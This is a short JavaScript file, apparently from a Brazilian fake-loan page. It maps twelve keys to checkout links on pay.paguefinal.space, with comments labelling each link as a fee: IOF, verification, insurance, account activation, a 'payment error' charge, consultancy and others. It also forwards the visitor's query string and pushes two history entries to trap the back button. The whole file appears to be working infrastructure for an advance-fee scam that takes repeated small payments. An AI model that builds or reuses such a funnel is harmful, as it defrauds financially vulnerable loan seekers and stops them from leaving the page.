const baseLinks = {
    up1: "https://pay.paguefinal.space/c/c53d4d63-3164-4620-b0e1-d5be6f89c7c2", // IOF
    up2: "https://pay.paguefinal.space/c/471b4a4d-ee84-4b5c-905e-3196fbb7aeeb", // Taxa de verificação de IOF
    up3: "https://pay.paguefinal.space/c/49e3ee56-f5f9-41d2-924a-ca519e508a7b", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.paguefinal.space/c/7153b9df-5c4c-4d4a-af53-40d5170ddc46", // NFe
    up5: "https://pay.paguefinal.space/c/7b324c81-31fa-47c3-bb0a-29b46be658d2", // Ativar conta
    up6: "https://pay.paguefinal.space/c/945d7f19-4af6-475e-b606-2db54d7f23d0", // Taxa de registro do contrato
    up7: "https://pay.paguefinal.space/c/ee799875-a624-4393-b5e8-57c97c9d8316", // Parabéns, 20k adicional
    up8: "https://pay.paguefinal.space/c/3ddd6223-f6c6-44fc-8e62-fa77087c78af", // Erro no pagamento - 14,06
    up9: "https://pay.paguefinal.space/c/fbc51445-40ff-4d75-925c-5c14a076b89a", // APP - 11,99
    up10:"https://pay.paguefinal.space/c/cd502a39-b123-4e97-a4b4-cf12006c7d82", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.paguefinal.space/c/3c6884d8-744c-423e-ba6c-f1bb8af60e6f", // Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.paguefinal.space/c/b0169469-cebc-43af-8ef4-076055e8b716" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);

